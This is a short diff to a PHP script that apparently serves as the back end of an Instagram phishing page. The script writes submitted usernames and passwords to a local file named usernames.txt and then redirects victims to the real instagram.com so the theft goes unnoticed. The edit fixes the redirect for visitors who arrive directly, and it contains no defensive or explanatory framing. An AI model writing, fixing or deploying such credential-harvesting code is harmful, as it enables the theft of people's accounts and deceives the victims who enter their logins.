@@ -10,12 +10,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         file_put_contents("usernames.txt", "Instagram Username: " . $username . " . Pass: " . $password . "\n", FILE_APPEND);
     }
 
-    $url = "https://instagram.com"; 
+    $url = "https://instagram.com";
     header("Location: $url");
     exit();
 } else {
     // Si entran directo sin pasar por el formulario, los mandamos a tu diseño visual
-    header("Location: login.html.php"); 
-header("Location: index.html");
+    header("Location: index.html");
+    exit();
 }
 ?>
